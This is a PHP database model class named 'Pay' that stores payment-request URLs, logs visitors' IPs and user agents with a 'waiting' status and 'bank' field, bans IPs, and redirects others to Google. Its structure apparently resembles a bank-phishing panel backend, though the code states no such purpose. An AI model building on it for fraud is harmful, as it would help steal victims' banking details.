<?php

namespace App\Models\Pay;

use PDO;
use \Datetime;

class Pay extends \Core\Model
{
    public function checkPayment($url = []) 
    {
        $sql = 'SELECT * FROM requests WHERE url = :url';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':url', $url, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return $data;
        }
        return false;
    }

    public function createLog($username, $url, $uid, $ip, $agent) 
    {
        $sql = 'INSERT INTO logs (username, url, user_id, ip, user_agent, waiting) VALUES (:username, :url, :user_id, :ip, :user_agent, :waiting)';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':username', $username, PDO::PARAM_STR);
        $stmt->bindValue(':url', $url, PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':ip', $ip, PDO::PARAM_STR);
        $stmt->bindValue(':user_agent', $agent, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->execute();
    }

    public function findLog($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return true;
        }
        return false;
    }

    public static function findBan($ip)
    {
        $sql = 'SELECT * FROM bans WHERE ip = :ip';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':ip', $ip, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetchAll();

        if ($data) {
            return true;
        }
        return false;
    }

    public static function redirect()
    {
        $sql = 'SELECT * FROM redirect WHERE id = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', 1, PDO::PARAM_INT);
        $stmt->execute();
        $data = $stmt->fetch();

        if ($data) {
            header('location: ' . $data['redirect']);
            exit;
        } else {
            header('location: https://www.google.nl');
            exit;
        }
    }

    public static function updateStatus($user)
    {
        $sql = 'UPDATE logs SET waiting = :waiting, bank = :bank WHERE user_id = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':bank', null, PDO::PARAM_NULL);
        $stmt->bindValue(':id', $user, PDO::PARAM_STR);
        $stmt->execute();
    }
}